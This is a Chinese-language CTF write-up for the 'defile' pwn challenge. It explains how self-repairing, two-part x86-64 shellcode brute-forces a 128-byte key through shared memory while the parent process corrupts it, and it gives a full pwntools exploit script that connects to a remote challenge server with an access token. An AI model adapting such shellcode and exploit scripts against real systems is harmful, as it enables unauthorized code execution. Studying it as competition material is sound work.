# defile

输入并在子进程执行一段shellcode(分成两段执行):

```
uint64_t targetaddr = (uint64_t)shared + (i % 2) * ((4096 - 2) / 2);
                __asm__(
                    "mov $0xdeadbeefdeadbeef, %%rax\n\t"
                    "mov $0xdeadbeefdeadbeef, %%rbx\n\t"
                    "mov $0xdeadbeefdeadbeef, %%rcx\n\t"
                    "mov $0xdeadbeefdeadbeef, %%rdi\n\t"
                    "mov $0xdeadbeefdeadbeef, %%rsi\n\t"
                    "mov $0xdeadbeefdeadbeef, %%r8\n\t"
                    "mov $0xdeadbeefdeadbeef, %%r9\n\t"
                    "mov $0xdeadbeefdeadbeef, %%r10\n\t"
                    "mov $0xdeadbeefdeadbeef, %%r11\n\t"
                    "mov $0xdeadbeefdeadbeef, %%r12\n\t"
                    "mov $0xdeadbeefdeadbeef, %%r13\n\t"
                    "mov $0xdeadbeefdeadbeef, %%r14\n\t"
                    "mov $0xdeadbeefdeadbeef, %%r15\n\t"
                    "jmp *%%rdx\n\t"
                    :
                    :"d"(targetaddr)
                    :
                );
```

两进程间共享一段内存，需要爆破128字节的随机key值，且每次父进程判断成功会对shellcode随机位置进行patch(0xcccccccccccccccc)，128轮后从pipe read 128字节，判断与随机key序列相同则输出flag，所以shellcode需要:

- 能够不断爆破: 循环即可
- 需要能够对抗修改: 利用shellcode分成两段，两者互相进行恢复(每段shellcode存储两份)
- 能够判断爆破成功: 循环搜索patch的0xcccccccccccccccc即可
- 内存同步: 构造循环来等待
- 需要在父进程read前将所有爆破出的字符写入管道: 利用程序本身设置的flags位：flags位为1时for循环才会继续，故而爆破时及时利用此标志位lock父进程即可

## EXP
```
from pwn import *
import time
context(arch="amd64",log_level="debug")
b='''
jmp $+2
mov rax,rdx
add rax,2040
mov r14,rax
add rax,0xd0
mov r8,0
loop_:
	mov byte ptr [rdx+4094],1
	mov r9,qword ptr [r14+r8*8]
	cmp r9d,0xcccccccc
	jz do_patch1

mov qword ptr [rax+r8*8],r9

do_patch1_ret:
	add r8,1
	cmp r8,21
	jnz loop_
	cmp byte ptr [rdx+4091],0
	jz  main
	jmp main1

do_patch1:
	mov r10,qword ptr [rax+r8*8]
	mov qword ptr [r14+r8*8],r10
	jmp do_patch1_ret
main1:
	push rdx
	mov rdi,4
	mov rsi,rdx
	add rsi,4095
	mov rdx,1
	mov rax,1
	syscall
	pop rdx
main:
	mov byte ptr [rdx+4091],1
	mov r8,0
	mov r10,0

loop4:
	mov r9d,dword ptr[rdx+r8*8+4]
	cmp r9d,0xcccccccc
	jz do_patch2

do_patch2_ret:
	add r8,1
	cmp r8,510
	jz main3
	jmp loop4

do_patch2:
        mov dword ptr[rdx+r8*8+4],0
	jmp do_patch2_ret

main3:
	xor rcx,rcx
	xor rbx,rbx
	mov rax,0

loop:
	mov byte ptr [rdx+4094],1
	mov byte ptr [rdx+4095],al
	mov byte ptr [rdx+4094],0
	xor r15d,r15d
wait:
	mov byte ptr [rdx+4080],0
	mov byte ptr [rdx+4080],0
	add r15d,1
	cmp r15d,20000
	jnz wait
	jmp check

check_done:
	cmp rcx,1
	jz success
	add al,1
	jmp loop

success:
	mov byte ptr [rdx+4092],al
	jmp do_write

do_write:
	ret

check:
	mov r8,0
	mov r10,0

loop2:
	nop
	mov r9d,dword ptr[rdx+r8*8+4]
	cmp r9d,0xcccccccc
	jz exit_find1

loop3:
	add r8,1 
	cmp r8,510
	jz exit_find2
	jmp loop2

exit_find1:
        mov dword ptr[rdx+r8*8+4],0
	mov cl,1
	jmp success
exit_find2:
	mov cl,0
	jmp check_done
'''
c='''
sub rdx,2047
mov rax,rdx
add rax,0x150
mov r8,0
loop:
	mov r9,qword ptr [rdx+r8*8]
	cmp r9w,0xcccc
	jz do_patch1

mov qword ptr [rax+r8*8],r9

do_patch1_ret:
	add r8,1
	cmp r8,38
	jnz loop
        ret

do_patch1:
	mov r10,qword ptr [rax+r8*8]
	mov qword ptr [rdx+r8*8],r10
	jmp do_patch1_ret
'''
#print len(asm(b))
#b='''
#jmp $
#'''
#f=open("./2.txt","wb")
#s=""
#for i in range(255):
#    s+=chr(i)
#f.write(asm(a))
#f.close()
#p=process("./defile")
p=remote("39.97.171.121",40005)
#gdb.attach(p)
p.sendlineafter(":\n","icqb9a2f33dcbc33f2f271a7fce82a0a")
time.sleep(1)
payload=(asm(b).ljust(0x150,"\x00"))*2
payload=payload.ljust(2047,"\x00")
payload+=(asm(c).ljust(0xd0,"\x00"))*2
p.send(payload.ljust(4094,"\x00"))
p.interactive()
```